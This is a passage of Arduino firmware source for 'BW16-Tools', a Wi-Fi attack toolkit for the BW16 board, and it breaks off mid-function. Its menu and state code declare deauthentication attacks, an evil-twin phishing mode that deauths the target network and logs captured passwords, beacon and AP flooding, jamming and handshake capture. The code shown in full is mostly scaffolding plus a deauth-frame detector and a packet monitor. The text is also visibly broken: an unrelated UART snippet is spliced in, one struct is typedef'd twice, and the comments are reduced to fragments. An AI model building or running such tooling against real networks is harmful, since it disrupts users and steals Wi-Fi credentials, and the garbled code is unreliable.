#include <vector>

// Bruce UART integration
#define BRUCE_CMD_PREFIX "BRUCE:"
#define BRUCE_RESP_PREFIX "BRUCE_RESP:"
#include "AnchorOTA.h"

// Send formatted response to Bruce via Serial
void sendToBruce(const char* format, ...) {
  char buffer[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buffer, sizeof(buffer), format, args);
  va_end(args);

  Serial.print(BRUCE_RESP_PREFIX);
  Serial.println(buffer);
}

/**
 * @file BW16-Tools.ino
 * @author FlyingIce
 * @brief BW16 WIFI Tools
 * @version 0.1
 * @date 2025-09-03
 * @link https://github.com/FlyingIceyyds/BW16-Tools
 */

//sdk
#include "SDK/WiFi.h"
#include "SDK/WiFiServer.h"
#include "SDK/WiFiClient.h"
#include "SDK/WiFi.cpp"
#include "SDK/WiFiClient.cpp"
#include "SDK/WiFiServer.cpp"
#include "SDK/WiFiSSLClient.cpp"
#include "SDK/WiFiUdp.cpp"

#include "wifi_conf.h"
#include "wifi_cust_tx.h"
void LinkJammer();
#include "wifi_util.h"
#include "wifi_structures.h"

#undef max
#undef min
#undef rand
#include <vector>
#include <set>
#include <utility>
#include "debug.h"
#include <Wire.h>
#include <algorithm>

// web
#include "WebPages/web_admin.h"
#include "WebPages/web_auth1.h"
#include "WebPages/web_auth2.h"
#include "web_config.h"
// Handshake capture module
#include "handshake.h"

// Fallback for FPSTR on cores that don't define it
#ifndef FPSTR
class __FlashStringHelper; // forward declaration for Arduino-style flash string helper
#define FPSTR(p) (reinterpret_cast<const __FlashStringHelper *>(p))
#endif

// DNSServer
#include "DNSServer.h"

// Display




#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1



U8g2Adapter u8g2;


const int UI_RIGHT_GUTTER = 10; // （WidthSpacing）
// Config（OptStart）
const int ANIM_STEPS = 6;       // （）
const int ANIM_DELAY_MS = 0;    // （Select）
// SelectLength（）：，SSID
const int SELECT_MOVE_TOTAL_MS = 60;
// FrameFreq：Frame //display（）
const int DISPLAY_FLUSH_EVERY_FRAMES = 2;
// Start（Short）
const int TITLE_FRAMES = 20;     // Add（Start<1s）
const int TITLE_DELAY_MS = 25;   // Frame
// SelectYesNo（）
static bool g_skipNextSelectAnim = false;

//
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_BACK PB2

// LED（BW16）
#ifndef LED_R
#define LED_R AMB_D12  // Red LED
#endif
#ifndef LED_G
#define LED_G AMB_D10  // Green LED
#endif
#ifndef LED_B
#define LED_B AMB_D11  // Blue LED
#endif

// ===== Web Test Forward Declarations =====
bool startWebTest();
void stopWebTest();
void handleWebTest();
void drawWebTestMain();
void drawWebTestInfo();
void drawWebTestPasswords();
void drawWebTestStatus();
void handleWebTestClient(WiFiClient& client);
void sendWebTestPage(WiFiClient& client);

// ===== UI Modal Forward Declaration =====
void showModalMessage(const String& line1, const String& line2 = String(""));
bool showConfirmModal(const String& line1,
                      const String& leftHint = String("《 Cancel"),
                      const String& rightHint = String("Confirm 》"));
bool showSelectSSIDConfirmModal();

// ===== Home Menu: unified registry and actions =====
typedef void (*HomeAction)();
struct HomeMenuItem {
  const char* label;
  HomeAction action;
};

// Forward declarations for home actions (handlers)
void homeActionSelectSSID();
void homeActionAttackMenu();
void homeActionQuickScan();
void homeActionPhishing();
void homeActionConnInterfere();
void homeActionBeaconTamper();
void homeActionApFlood();
void homeActionAttackDetect();
void homeActionPacketMonitor();
void homeActionDeepScan();
void homeActionWebUI();
void homeActionQuickCapture();

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
  int security_type;
} WiFiScanResult;

// ===== Handshake WebUI State =====
extern bool hs_sniffer_running;
static WiFiScanResult hs_selected_network = {};
static bool hs_has_selection = false;

// SelectedAP defined in handshake.h
SelectedAP _selectedNetwork;

// Provide AP_Channel compatible getter used by handshake.h
String AP_Channel = String(0);

// static String bytesToStr(const uint8_t* mac, int len) { // UsageFunc
//   char buf[3*6];
//   int n = 0; for (int i=0;i<len;i++){ n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]); }
//   return String(buf);
// }

// Credentials for you Wifi network
char *ssid = "";
char *pass = "";
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
// BeaconAttackSelect：0=, 1=5G, 2=2.4G
int beaconBandMode = 0;

// ===== URL/HTTP helpers =====
//  application/x-www-form-urlencoded （UTF-8）
/**
 * @brief Decode percent-encoded application/x-www-form-urlencoded text.
 *
 * Replaces '+' with space and decodes %HH sequences as raw UTF-8 bytes.
 * Invalid sequences are preserved as-is.
 *
 * @param input Input string to decode.
 * @return Decoded string.
 */
static String urlDecode(const String& input) {
  String out;
  out.reserve(input.length());
  for (size_t i = 0; i < (size_t)input.length(); i++) {
    char c = input[(int)i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < (size_t)input.length()) {
      char h1 = input[(int)i + 1];
      char h2 = input[(int)i + 2];
      auto hexVal = [](char ch) -> int {
        if (ch >= '0' && ch <= '9') return ch - '0';
        if (ch >= 'A' && ch <= 'F') return ch - 'A' + 10;
        if (ch >= 'a' && ch <= 'f') return ch - 'a' + 10;
        return -1;
      };
      int v1 = hexVal(h1);
      int v2 = hexVal(h2);
      if (v1 >= 0 && v2 >= 0) {
        char decoded = (char)((v1 << 4) | v2);
        out += decoded;
        i += 2;
      } else {
        // ，
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

// UTF-8StringSecuritymaxBytes（Medium）
/**
 * @brief Truncate a UTF-8 string by byte length without splitting multibyte chars.
 *
 * @param input Source UTF-8 string.
 * @param maxBytes Maximum number of bytes allowed in the result.
 * @return Truncated string not exceeding maxBytes.
 */
static String utf8TruncateByBytes(const String& input, int maxBytes) {
  if (maxBytes <= 0) return String("");
  const char* s = input.c_str();
  int len = (int)strlen(s);
  if (len <= maxBytes) return input;
  int bytes = 0;
  int lastSafe = 0;
  for (int i = 0; i < len; ) {
    unsigned char c = (unsigned char)s[i];
    int charLen = 1;
    if ((c & 0x80) == 0x00) {
      charLen = 1; // 0xxxxxxx
    } else if ((c & 0xE0) == 0xC0) {
      charLen = 2; // 110xxxxx
    } else if ((c & 0xF0) == 0xE0) {
      charLen = 3; // 1110xxxx
    } else if ((c & 0xF8) == 0xF0) {
      charLen = 4; // 11110xxx
    } else {
      // ，，
      charLen = 1;
    }
    if (bytes + charLen > maxBytes) break;
    bytes += charLen;
    lastSafe = i + charLen;
    i += charLen;
  }
  String out;
  out.reserve(bytes);
  for (int i = 0; i < lastSafe; i++) out += s[i];
  return out;
}

static inline bool is24GChannel(int ch) {
  return ch >= 1 && ch <= 14;
}



static inline bool is5GChannel(int ch) {
  return ch >= 36; // ：5GChannel36
}

bool BeaconBandMenu();
void StableBeacon();
int current_channel = 1;
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;

std::vector<WiFiScanResult> scan_results;
std::vector<int> SelectedVector;
// SelectStatus： scan_results ，0 Medium / 1 Medium（ O(1) ）
std::vector<uint8_t> selectedFlags;
// Usage，RunStatus
// bool deauth_running = false;
// deauth_bssid ，Height
uint8_t becaon_bssid[6];
// UsageSSIDVar
// String SelectedSSID;
// String SSIDCh;
// Usage（UsageConst），
// unsigned long SCROLL_DELAY = 300; // DelayTime
int attackstate = 0;
int menustate = 0;
int deauthstate = 0;
int scrollindex = 0;
int perdeauth = 10;  // AddAttackRSSI
int num = 0; // Var

// Pagination（Attack）
int homeStartIndex = 0;
// Select（AttackattackstateClass）
int homeState = 0; // Init0，

// Unified registry: add new items here only (main menu)
static const HomeMenuItem g_homeMenuItems[] = {
  {"SelectAP/SSID",            homeActionSelectSSID},
  {"Attack[Attack]",       homeActionAttackMenu},
  {"Scan[Scan]",         homeActionQuickScan},
  {"PasswordPhishing[Phishing]",     homeActionPhishing},
  {"Connect/ChannelJam[CI]",      homeActionConnInterfere},
  {"Broadcast[BBH]",           homeActionBeaconTamper},
  {"APFloodAttack[Dos]",        homeActionApFlood},
  {"AttackFrameDetect[Detect]",     homeActionAttackDetect},
  {"[Monitor]",        homeActionPacketMonitor},
  {"Scan DeepScan",      homeActionDeepScan},
  {"Packet[Capture]",      homeActionQuickCapture},
  {"Start[Web UI]",           homeActionWebUI}
};
static const int g_homeMenuCount = (int)(sizeof(g_homeMenuItems) / sizeof(g_homeMenuItems[0]));
static inline int getHomeMaxItems() { return g_homeMenuCount; }
#define HOME_MAX_ITEMS (getHomeMaxItems())

const int HOME_PAGE_SIZE = 3;
const int HOME_ITEM_HEIGHT = 20; // AddHeightHeight
const int HOME_Y_OFFSET = 2;
const int HOME_RECT_HEIGHT = 18; // AddHeight

// Web UIVar
bool web_ui_active = false;
bool web_test_active = false;
bool web_server_active = false;
bool dns_server_active = false;
// Handshake sniffer running flag (used by WebUI and handshake.h)
bool hs_sniffer_running = false;

// PacketVar
bool quick_capture_active = false;
bool quick_capture_completed = false;
int quick_capture_mode = 0; // 0=, 1=, 2=Height
unsigned long quick_capture_start_time = 0;

// ============ AttackStatusManageSystem ============
// AttackRunStatus
enum AttackMode {
  ATTACK_IDLE = 0,
  ATTACK_SINGLE,
  ATTACK_MULTI,
  ATTACK_AUTO_SINGLE,
  ATTACK_AUTO_MULTI,
  ATTACK_ALL,
  ATTACK_BEACON_DEAUTH
};

// AttackStatusManage
struct DeauthAttackState {
  AttackMode mode;
  bool running;

  // TimeManage
  unsigned long lastPacketMs;
  unsigned long lastUIUpdateMs;
  unsigned long lastButtonCheckMs;
  unsigned long lastLEDToggleMs;
  unsigned long lastScanMs;

  // TargetManage
  size_t currentTargetIndex;
  size_t currentChannelBucketIndex;
  size_t currentBssidIndexInBucket;

  // Stats
  int packetCount;
  bool ledState;

  // Config
  unsigned int packetsPerCycle;
  unsigned int uiUpdateInterval;
  unsigned int buttonCheckInterval;
  unsigned int ledBlinkInterval;

  // Channel
  int lastChannel;
  bool channelSet;
};

// AttackStatus
DeauthAttackState g_deauthState = {
  .mode = ATTACK_IDLE,
  .running = false,
  .lastPacketMs = 0,
  .lastUIUpdateMs = 0,
  .lastButtonCheckMs = 0,
  .lastLEDToggleMs = 0,
  .lastScanMs = 0,
  .currentTargetIndex = 0,
  .currentChannelBucketIndex = 0,
  .currentBssidIndexInBucket = 0,
  .packetCount = 0,
  .ledState = false,
  .packetsPerCycle = 10,
  .uiUpdateInterval = 500,
  .buttonCheckInterval = 100,
  .ledBlinkInterval = 500,
  .lastChannel = -1,
  .channelSet = false
};
unsigned long quick_capture_end_time = 0;

// PhishingMode：Turn OffStart，RestartDevice
bool g_webTestLocked = false;
// WebUI：StartStartAPMode，RestartDevice
bool g_webUILocked = false;
//：DNSServerStartAbnormal，

DNSServer dnsServer;
WiFiServer web_server(WEB_SERVER_PORT);
WiFiClient web_client;
unsigned long last_web_check = 0;
const unsigned long WEB_CHECK_INTERVAL = 100; // Web

// Web Test Config（SSIDSettings）
String web_test_ssid_dynamic = WEB_TEST_SSID;
int web_test_channel_dynamic = WEB_TEST_CHANNEL;
// Web Test TextLog
std::vector<String> web_test_submitted_texts;
static int webtest_password_scroll = 0;
static int webtest_password_cursor = 0;
// Web Test OLED Status：0=，1=Info，2=PasswordList，3=RunStatus
static int webtest_ui_page = 0;
// RecvPasswordTime，Height
static bool webtest_border_always_on = false;
static int webtest_flash_remaining_toggles = 0; // 4 toggles =
static unsigned long webtest_last_flash_toggle_ms = 0;
static bool webtest_border_flash_visible = true;
	// PhishingMode：TargetBSSIDDeauth
	static bool phishingHasTarget = false;
	static uint8_t phishingTargetBSSID[6] = {0};
	static unsigned long lastPhishingDeauthMs = 0;
	static unsigned long lastPhishingBroadcastMs = 0;
	static int phishingDeauthInterval = 500; // ：Connect
	static int phishingBatchSize = 10; // ：Connect

// AttackDetectBorderVar
static bool detect_border_always_on = false;
static int detect_flash_remaining_toggles = 0; // 4 toggles =
static unsigned long detect_last_flash_toggle_ms = 0;
static bool detect_border_flash_visible = true;

// ============ AttackDetect（Deauth/DisconnectFrame） ============
#if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
extern "C" {
#include "wifi_conf.h"
}
#endif
static volatile unsigned long g_detectDeauthCount = 0;
static volatile unsigned long g_detectDisassocCount = 0;
static bool g_attackDetectRunning = false;
static unsigned long g_attackDetectLastDrawMs = 0;
static unsigned long g_attackDetectLastChSwitchMs = 0;
static int g_attackDetectChIndex = 0; // Channel
static uint8_t g_localMacForDetect[6] = {0};
static volatile uint8_t g_lastDetectSrc[6] = {0};
static volatile uint8_t g_lastDetectKind = 0; // 0xC0 deauth, 0xA0 disassoc
static unsigned long g_lastDetectLogMs = 0;
static volatile uint16_t g_lastReason = 0;

// PacketVar
static bool g_packetDetectRunning = false;
static unsigned long g_packetDetectLastDrawMs = 0;
static volatile unsigned long g_packetCount = 0; // Packet
static unsigned long g_packetCountLastReset = 0; // Time
static int g_packetDetectChannel = 1; // ListenChannel
static unsigned long g_packetDetectStartTime = 0; // StartTime
static unsigned long g_packetDetectLastChannelSwitch = 0; // ChannelTime
static volatile unsigned long g_packetDetectTotalPackets = 0; // Packet
static unsigned long g_packetDetectHistory[64] = {0}; // HistoryPacket（Chart）
static int g_packetDetectHistoryIndex = 0; // HistoryData

// PacketUIStatusVar
static bool g_showDownIndicator = false; //
static bool g_showUpIndicator = false;   //

// ManageFrameDetect
static bool g_showMgmtFrameIndicator = false; // ManageFrame
static unsigned long g_mgmtFrameIndicatorStartTime = 0; // ManageFrameStartTime
static const unsigned long MGMT_FRAME_INDICATOR_TIME = 1000; // ManageFrameTime（）

// 2.4G5GChannelList
static const int channels24G[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
static const int channels5G[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
static const int channels24GCount = sizeof(channels24G) / sizeof(channels24G[0]);
static const int channels5GCount = sizeof(channels5G) / sizeof(channels5G[0]);

// UsageChannelList
static int g_currentChannelListIndex = 0;
static bool g_using24G = true; // true=2.4G, false=5G

// StatusDetectVar
static bool g_upKeyPressed = false;
static bool g_downKeyPressed = false;
static unsigned long g_upKeyPressTime = 0;
static unsigned long g_downKeyPressTime = 0;
static const unsigned long KEY_DEBOUNCE_MS = 50; // Time

// ChannelVar
static bool g_channelPreviewMode = false;
static int g_previewChannel = 1;
static bool g_usingPreview24G = true;
static int g_previewChannelListIndex = 0;
static unsigned long g_lastPreviewSwitchTime = 0; // Time
static bool g_previewSwitchPending = false; //

// Channel
enum ChannelGroupType {
  CHANNEL_GROUP_24G_5G_COMMON = 0,  // 2.4G+5GChannel（Default）
  CHANNEL_GROUP_24G_ALL = 1,        // 2.4GAllChannel
  CHANNEL_GROUP_5G_ALL = 2,         // 5GAllChannel
  CHANNEL_GROUP_24G_5G_ALL = 3,     // 2.4G+5GAllChannel
  CHANNEL_GROUP_COUNT
};

static int g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON; // Channel

// 2.4GAllChannel
static const uint8_t detectChannels24GAll[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14};

// 5GAllChannel
static const uint8_t detectChannels5GAll[] = {36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};

// 2.4G+5GChannel（Default）
static const uint8_t detectChannels24G5GCommon[] = {1,6,11,3,8,13,36,40,44,48,149,153,157,161,165};

// 2.4G+5GAllChannel
static const uint8_t detectChannels24G5GAll[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};

// ChannelChannelArray
static const uint8_t* getCurrentChannelGroup(int& count) {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      count = sizeof(detectChannels24GAll) / sizeof(detectChannels24GAll[0]);
      return detectChannels24GAll;
    case CHANNEL_GROUP_5G_ALL:
      count = sizeof(detectChannels5GAll) / sizeof(detectChannels5GAll[0]);
      return detectChannels5GAll;
    case CHANNEL_GROUP_24G_5G_COMMON:
      count = sizeof(detectChannels24G5GCommon) / sizeof(detectChannels24G5GCommon[0]);
      return detectChannels24G5GCommon;
    case CHANNEL_GROUP_24G_5G_ALL:
      count = sizeof(detectChannels24G5GAll) / sizeof(detectChannels24G5GAll[0]);
      return detectChannels24G5GAll;
    default:
      count = sizeof(detectChannels24G5GCommon) / sizeof(detectChannels24G5GCommon[0]);
      return detectChannels24G5GCommon;
  }
}

// Channel
static String getCurrentChannelGroupName() {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      return "2.4GAllChannel";
    case CHANNEL_GROUP_5G_ALL:
      return "5GAllChannel";
    case CHANNEL_GROUP_24G_5G_COMMON:
      return "2.4G+5GChannel";
    case CHANNEL_GROUP_24G_5G_ALL:
      return "2.4G+5GAllChannel";
    default:
      return "2.4G+5GChannel";
  }
}

// Channel
static String getCurrentChannelGroupShortName() {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      return "2.4G";
    case CHANNEL_GROUP_5G_ALL:
      return "5G";
    case CHANNEL_GROUP_24G_5G_COMMON:
      return "";
    case CHANNEL_GROUP_24G_5G_ALL:
      return "All";
    default:
      return "";
  }
}

// Channel
static void switchToNextChannelGroup() {
  g_currentChannelGroup = (g_currentChannelGroup + 1) % CHANNEL_GROUP_COUNT;
  g_attackDetectChIndex = 0; // Channel

  // ChannelChannel
  int count;
  const uint8_t* channels = getCurrentChannelGroup(count);
  if (count > 0) {
    wext_set_channel(WLAN0_NAME, channels[0]);
    Serial.print("[Detect] Switched to channel group: ");
    Serial.print(getCurrentChannelGroupName());
    Serial.print(" (first channel: "); Serial.print(channels[0]); Serial.println(")");
  }
}



// BW16/RTL8720DN: 2.4GHz DetectChannel（）
static const uint8_t detectChannels24G[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static volatile unsigned long g_promiscCbHits = 0;
static volatile unsigned long g_mgmtFramesSeen = 0;
static volatile uint32_t g_subtypeHistogram[16] = {0};
static unsigned long g_detectStickyUntilMs = 0; // AttackFrameChannel
// ：→
struct DetectEvent { uint8_t mac[6]; uint8_t kind; unsigned long ts; };
static volatile unsigned int g_evHead = 0, g_evTail = 0;
static DetectEvent g_evBuf[64];
// Log
struct SuspectRecord {
  uint8_t bssid[6];
  unsigned long deauthCount;
  unsigned long disassocCount;
  unsigned long lastSeenMs;
};
static std::vector<SuspectRecord> g_suspects;
static unsigned long g_totalDeauth = 0;
static unsigned long g_totalDisassoc = 0;
// UI Status
static int g_detectUiMode = 0; // 0=,1=LogList,2=Stats
static int g_recordsPage = 0;
// （"Log"）
struct TempCount { uint8_t bssid[6]; unsigned int d; unsigned int a; };
static std::vector<TempCount> g_tempCounts;

#if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
extern "C" {
  int wifi_set_mgnt_rxfilter(uint8_t enable);
  typedef struct { uint8_t filter_mode; } promisc_filter_t;
  #ifndef PROMISC_FILTER_MASK_MGMT
  #define PROMISC_FILTER_MASK_MGMT 0x01
  #endif
  int wifi_set_promisc_filter(promisc_filter_t *f);
  int wifi_set_promisc_filter_reason(uint8_t enable);
}
#endif

// Mode：AmebaD Usage wifi_set_promisc(RTW_PROMISC_ENABLE/DISABLE,...)

// 802.11ManageFrame，StatsDeauth/Disassoc
static void promiscDetectCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 24) {
    // AddDebugInfo：LogShortFrame
    static unsigned long lastShortFrameLog = 0;
    if (millis() - lastShortFrameLog > 5000) {
      Serial.print("[Detect] Short frame received: len="); Serial.println(len);
      lastShortFrameLog = millis();
    }
    return;
  }

  g_promiscCbHits++;

  // AddDebugInfo：LogRecvFrame
  static unsigned long lastFrameLog = 0;
  if (millis() - lastFrameLog > 10000) {
    Serial.print("[Detect] Frame received: len="); Serial.print(len);
    Serial.print(" buf[0]="); Serial.print(buf[0], HEX);
    Serial.print(" buf[1]="); Serial.println(buf[1], HEX);
    lastFrameLog = millis();
  }

  // SDK：0,4,8,24,32,36,40（Size）
  const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
  for (size_t t = 0; t < sizeof(tryOffsets)/sizeof(tryOffsets[0]); t++) {
    int off = tryOffsets[t];
    if (len < (unsigned)(off + 24)) continue;
    const uint8_t *base = buf + off;
    uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;

    // LogManageFrameType
    if (type == 0) {
      g_mgmtFramesSeen++;
      if (subtype < 16) g_subtypeHistogram[subtype]++;

      // AddDebugInfo：LogManageFrame
      static unsigned long lastMgmtLog = 0;
      if (millis() - lastMgmtLog > 5000) {
        Serial.print("[Detect] Management frame: type="); Serial.print(type);
        Serial.print(" subtype="); Serial.print(subtype);
        Serial.print(" fc=0x"); Serial.println(fc, HEX);
        lastMgmtLog = millis();
      }
    }

    if (type != 0) continue; // StatsManageFrame
    bool isDeauth = (subtype == 12);
    bool isDisassoc = (subtype == 10);
    if (!isDeauth && !isDisassoc) continue;

    const uint8_t *src = base + 10; // 2
    bool fromSelf = true;
    for (int i = 0; i < 6; i++) { if (src[i] != g_localMacForDetect[i]) { fromSelf = false; break; } }
    if (fromSelf) return; //

    // LogAttackFrameDetect
    Serial.print("[Detect] Attack frame detected: ");
    Serial.print(isDeauth ? "Deauth" : "Disassoc");
    Serial.print(" from ");
    for (int i = 0; i < 6; i++) { Serial.print(src[i], HEX); if (i<5) Serial.print(":"); }
    Serial.println();

    // SettingsManageFrame（AttackDetect）
    g_showMgmtFrameIndicator = true;
    g_mgmtFrameIndicatorStartTime = millis();

    //
    unsigned int nh = (g_evHead + 1) & 63;
    if (nh != g_evTail) {
      for (int i = 0; i < 6; i++) g_evBuf[g_evHead].mac[i] = src[i];
      g_evBuf[g_evHead].kind = isDeauth ? 0xC0 : 0xA0;
      g_evBuf[g_evHead].ts = millis();
      g_evHead = nh;
    }
    // "Log"
    int tIdx = -1; for (size_t j = 0; j < g_tempCounts.size(); j++) { bool eq=true; for(int k=0;k<6;k++) if (g_tempCounts[j].bssid[k]!=src[k]) {eq=false;break;} if(eq){tIdx=(int)j;break;} }
    if (tIdx == -1) { TempCount tc; memcpy(tc.bssid, src, 6); tc.d = isDeauth?1:0; tc.a = isDisassoc?1:0; g_tempCounts.push_back(tc); }
    else { if (isDeauth) g_tempCounts[tIdx].d++; if (isDisassoc) g_tempCounts[tIdx].a++; }
    // OLED
    if (isDeauth) { g_lastDetectKind = 0xC0; } else { g_lastDetectKind = 0xA0; }
    for (int i = 0; i < 6; i++) g_lastDetectSrc[i] = src[i];
    if (len >= (unsigned)(off + 26)) { uint16_t r; memcpy(&r, base + 24, sizeof(r)); g_lastReason = r; }
    // AttackFrameMedium，Channel 3 ，Stats
    g_detectStickyUntilMs = millis() + 3000;
    return;
  }
}

// PacketFunc：StatsRecvPacket
static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 10) { // SmallLength，Packet
    return;
  }

  // AddPacket（StatsPacket）
  g_packetCount++;
  g_packetDetectTotalPackets++;

  // DetectDeauthFrameDeauthFrame（AttackDetect）
  if (len >= 24) {
    // SDK：0,4,8,24,32,36,40（Size）
    const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
    for (size_t t = 0; t < sizeof(tryOffsets)/sizeof(tryOffsets[0]); t++) {
      int off = tryOffsets[t];
      if (len < (unsigned)(off + 24)) continue;
      const uint8_t *base = buf + off;
      uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
      uint8_t type = (fc >> 2) & 0x3;
      uint8_t subtype = (fc >> 4) & 0xF;


      // DetectDeauthFrame（subtype=12）DeauthFrame（subtype=10）
      if (type == 0) { // ManageFrame
        bool isDeauth = (subtype == 12);
        bool isDisassoc = (subtype == 10);
        if (isDeauth || isDisassoc) {
          // SettingsManageFrame
          g_showMgmtFrameIndicator = true;
          g_mgmtFrameIndicatorStartTime = millis();
          Serial.print("[PacketDetect] Attack frame detected: ");
          Serial.print(isDeauth ? "Deauth" : "Disassoc");
          Serial.print(" subtype="); Serial.println(subtype);
          break; // TargetFrameExit
        }
      }
    }
  }
}

// StartPacket
static void startPacketDetection() {
  g_packetCount = 0;
  g_packetDetectTotalPackets = 0;
  g_packetDetectRunning = true;
  g_packetDetectStartTime = millis();
  g_packetDetectLastChannelSwitch = millis();
  g_packetCountLastReset = millis();

  // InitChannelList
  g_currentChannelListIndex = 0;
  g_using24G = true;
  g_packetDetectChannel = channels24G[0]; // 2.4GChannel1Start

  // EmptyHistoryData
  for (int i = 0; i < 64; i++) {
    g_packetDetectHistory[i] = 0;
  }
  g_packetDetectHistoryIndex = 0;

  Serial.println("[PacketDetect] Starting packet detection...");
  Serial.print("[PacketDetect] Initial channel: "); Serial.println(g_packetDetectChannel);

  // SettingsChannel
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);

  // Turn OffMode
  WiFi.disablePowerSave();

  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
  {
    // Settings，TypePacket
    Serial.println("[PacketDetect] No filter set - monitoring all packet types");

    int rcR = wifi_set_promisc_filter_reason(0); //
    Serial.print("[PacketDetect] wifi_set_promisc_filter_reason(0) rc="); Serial.println(rcR);

    int rc = wifi_set_mgnt_rxfilter(0); // ManageFrame
    Serial.print("[PacketDetect] wifi_set_mgnt_rxfilter(0) rc="); Serial.println(rc);
  }
  #endif

  // Mode
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscPacketDetectCallback, 1);
  Serial.print("[PacketDetect] wifi_set_promisc(RTW_PROMISC_ENABLE_2, len=1) rc="); Serial.println(rc);

  if (rc != 0) {
    Serial.println("[PacketDetect] RTW_PROMISC_ENABLE_2 failed, trying RTW_PROMISC_ENABLE");
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, promiscPacketDetectCallback, 1);
    Serial.print("[PacketDetect] wifi_set_promisc(RTW_PROMISC_ENABLE, len=1) rc="); Serial.println(rc);
  }
}

// StopPacket
static void stopPacketDetection() {
  Serial.println("[PacketDetect] Stopping packet detection...");

  // Turn OffMode
  #if defined(RTW_PROMISC_DISABLE)
  {
    int rc = wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
    Serial.print("[PacketDetect] wifi_set_promisc(DISABLE) rc="); Serial.println(rc);
  }
  #endif

  // RestoreMode
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
  {
    int rc = wifi_set_mgnt_rxfilter(0);
    Serial.print("[PacketDetect] wifi_set_mgnt_rxfilter(0) rc="); Serial.println(rc);
  }
  #endif

  // StatusVar
  g_packetDetectRunning = false;
  g_packetDetectLastDrawMs = 0;
  g_packetDetectLastChannelSwitch = 0;
  g_packetCount = 0;
  g_packetDetectTotalPackets = 0;

  // Status
  g_upKeyPressed = false;
  g_downKeyPressed = false;
  g_upKeyPressTime = 0;
  g_downKeyPressTime = 0;

  // Status
  g_channelPreviewMode = false;
  g_previewChannel = 1;
  g_usingPreview24G = true;
  g_previewChannelListIndex = 0;
  g_lastPreviewSwitchTime = 0;
  g_previewSwitchPending = false;

  // RestoreDefaultFontSettingsMedium
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  Serial.println("[PacketDetect] Packet detection stopped and resources cleaned up");
}

// Channel
static void switchToNextPacketDetectChannel() {
  if (g_using24G) {
    g_currentChannelListIndex++;
    if (g_currentChannelListIndex >= channels24GCount) {
      // 5G
      g_using24G = false;
      g_currentChannelListIndex = 0;
    }
  } else {
    g_currentChannelListIndex++;
    if (g_currentChannelListIndex >= channels5GCount) {
      // 2.4G
      g_using24G = true;
      g_currentChannelListIndex = 0;
    }
  }

  g_packetDetectChannel = g_using24G ? channels24G[g_currentChannelListIndex] : channels5G[g_currentChannelListIndex];

  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // ChannelPacket

  Serial.print("[PacketDetect] Switched to channel: "); Serial.println(g_packetDetectChannel);
}

// Channel
static void switchToPrevPacketDetectChannel() {
  if (g_using24G) {
    g_currentChannelListIndex--;
    if (g_currentChannelListIndex < 0) {
      // 5GChannel
      g_using24G = false;
      g_currentChannelListIndex = channels5GCount - 1;
    }
  } else {
    g_currentChannelListIndex--;
    if (g_currentChannelListIndex < 0) {
      // 2.4GChannel
      g_using24G = true;
      g_currentChannelListIndex = channels24GCount - 1;
    }
  }

  g_packetDetectChannel = g_using24G ? channels24G[g_currentChannelListIndex] : channels5G[g_currentChannelListIndex];

  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // ChannelPacket

  Serial.print("[PacketDetect] Switched to channel: "); Serial.println(g_packetDetectChannel);
}

// Channel（）
static void previewNextChannel() {
  if (g_usingPreview24G) {
    g_previewChannelListIndex++;
    if (g_previewChannelListIndex >= channels24GCount) {
      // 5G
      g_usingPreview24G = false;
      g_previewChannelListIndex = 0;
    }
  } else {
    g_previewChannelListIndex++;
    if (g_previewChannelListIndex >= channels5GCount) {
      // 2.4G
